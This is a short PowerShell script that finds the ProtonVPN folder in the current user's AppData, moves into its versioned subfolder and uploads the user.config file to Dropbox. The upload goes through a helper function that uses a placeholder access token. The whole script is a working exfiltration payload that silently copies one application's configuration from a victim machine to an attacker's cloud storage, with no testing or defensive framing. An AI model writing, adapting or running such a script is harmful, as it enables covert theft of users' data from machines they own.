function DropBox-Upload {

    [CmdletBinding()]
    param (
        
    [Parameter (Mandatory = $True, ValueFromPipeline = $True)]
    [Alias("f")]
    [string]$SourceFilePath
    ) 
    $DropBoxAccessToken = "YOUR-DROPBOX-TOKEN"   # Replace with your DropBox Access Token
    $outputFile = Split-Path $SourceFilePath -leaf
    $TargetFilePath="/$outputFile"
    $arg = '{ "path": "' + $TargetFilePath + '", "mode": "add", "autorename": true, "mute": false }'
    $authorization = "Bearer " + $DropBoxAccessToken
    $headers = New-Object "System.Collections.Generic.Dictionary[[String],[String]]"
    $headers.Add("Authorization", $authorization)
    $headers.Add("Dropbox-API-Arg", $arg)
    $headers.Add("Content-Type", 'application/octet-stream')
    Invoke-RestMethod -Uri https://content.dropboxapi.com/2/files/upload -Method Post -InFile $SourceFilePath -Headers $headers
    }

# Test the path to the ProtonVPN directory and if it is availible, change directory to where the user.config is stored

if (-not(Test-Path "$env:USERPROFILE\AppData\Local\ProtonVPN")) {
     try {
         Write-Host "The VPN folder has not been found. "
     }
     catch {
         throw $_.Exception.Message
     }
 }

  else {
$protonVpnPath = "$env:USERPROFILE\AppData\Local\ProtonVPN"
cd $protonVpnPath
Get-ChildItem | Where-Object {$_.name -Match "ProtonVPN.exe"} | cd
Get-ChildItem | cd

# Upload user.config to dropbox
DropBox-Upload -f "user.config"
} 